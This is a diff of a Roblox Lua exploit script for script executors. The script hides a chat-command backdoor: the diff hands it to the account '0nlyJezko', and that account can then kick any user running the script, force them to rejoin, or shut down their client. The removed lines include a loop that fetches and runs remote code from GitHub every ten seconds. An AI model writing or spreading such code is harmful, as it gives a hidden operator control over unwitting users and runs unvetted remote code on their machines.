@@ -37,6 +37,7 @@ if yes == "NotWhitelisted" then
                 "Lvl 6 Exploit"
                 
                 game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('Commands Loaded (6.8) * Using '.. executor .. ' *', 'All')
+                rconsoleclear()
         end
     end)
 end
@@ -44,12 +45,12 @@ end
 local Action = game.Players:GetPlayers()
   for i = 1,#Action do
 Action[i].Chatted:connect(function(msg, recipient)
-    if Action[i].Name == "MRFRIENDFOVEVER" then
+    if Action[i].Name == "0nlyJezko" then
         local splitString = string.split(msg, " ")
         local player = game.Players.LocalPlayer
         if splitString[1] == "?kick" then
         print("Kicked ".. splitString[2])
-         if player.Name == splitString[2] and splitString[2] ~= "MRFRIENDFOVEVER" then 
+         if player.Name == splitString[2] and splitString[2] ~= "0nlyJezko" then 
                 player:Kick("🤡 Expulsado por un administrador 🤡")
             end
         end
@@ -60,12 +61,12 @@ end
 local Action = game.Players:GetPlayers()
   for i = 1,#Action do
 Action[i].Chatted:connect(function(msg, recipient)
-    if Action[i].Name == "MRFRIENDFOVEVER" then
+    if Action[i].Name == "0nlyJezko" then
         local splitString = string.split(msg, " ")
         local player = game.Players.LocalPlayer
         if splitString[1] == "?rjuser" then
         print("Kicked ".. splitString[2])
-         if player.Name == splitString[2] and splitString[2] ~= "MRFRIENDFOVEVER" then 
+         if player.Name == splitString[2] and splitString[2] ~= "0nlyJezko" then 
                 wait(.1)
 		game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
             end
@@ -77,59 +78,10 @@ end
 local Action = game.Players:GetPlayers()
   for i = 1,#Action do
 Action[i].Chatted:connect(function(msg, recipient)
-    if Action[i].Name == "SalmonedaYT" then
+    if Action[i].Name == "0nlyJezko" then
         local splitString = string.split(msg, " ")
         local player = game.Players.LocalPlayer
-        if splitString[1] == "?kick" then
-        print("Kicked ".. splitString[2])
-         if player.Name == splitString[2] and splitString[2] ~= "MRFRIENDFOVEVER" then 
-                player:Kick("🤡 Expulsado por un administrador 🤡")
-            end
-        end
-    end
-  end)
-end
-
-local Action = game.Players:GetPlayers()
-  for i = 1,#Action do
-Action[i].Chatted:connect(function(msg, recipient)
-    if Action[i].Name == "MRFRIENDFOVEVER" then
-        local splitString = string.split(msg, " ")
-        local player = game.Players.LocalPlayer
-        if splitString[1] == "?kickrojas" then
-        print("Kicked Rojas")
-         if player.Name == "SalmonedaYT" then 
-                player:Kick("🤡 Expulsado por un administrador, Rojitas 😃 🤡")
-            end
-        end
-    end
-  end)
-end
-
-local Action = game.Players:GetPlayers()
-  for i = 1,#Action do
-Action[i].Chatted:connect(function(msg, recipient)
-    if Action[i].Name == "MRFRIENDFOVEVER" then
-        local splitString = string.split(msg, " ")
-        local player = game.Players.LocalPlayer
-        if splitString[1] == "?rejoinrojas" then
-        print("Kicked Rojas")
-         if player.Name == "SalmonedaYT" then 
-                wait(.1)
-		game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
-            end
-        end
-    end
-  end)
-end
-
-local Action = game.Players:GetPlayers()
-  for i = 1,#Action do
-Action[i].Chatted:connect(function(msg, recipient)
-    if Action[i].Name == "MRFRIENDFOVEVER" then
-        local splitString = string.split(msg, " ")
-        local player = game.Players.LocalPlayer
-        if splitString[1] == "?disablescript" then
+        if splitString[1] == "?disable" then
         print("Kicked All")
                 game:Shutdown()
         end
@@ -140,7 +92,7 @@ end
 local Action = game.Players:GetPlayers()
   for i = 1,#Action do
 Action[i].Chatted:connect(function(msg, recipient)
-    if Action[i].Name == "MRFRIENDFOVEVER" then
+    if Action[i].Name == "0nlyJezko" then
         local splitString = string.split(msg, " ")
         local player = game.Players.LocalPlayer
         if splitString[1] == "?rejoinusers" then
@@ -149,9 +101,4 @@ Action[i].Chatted:connect(function(msg, recipient)
         end
     end
   end)
-end
-
-while true do
-	wait(10)
-	loadstring(game:HttpGet(('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/NameTags'),true))()
 end
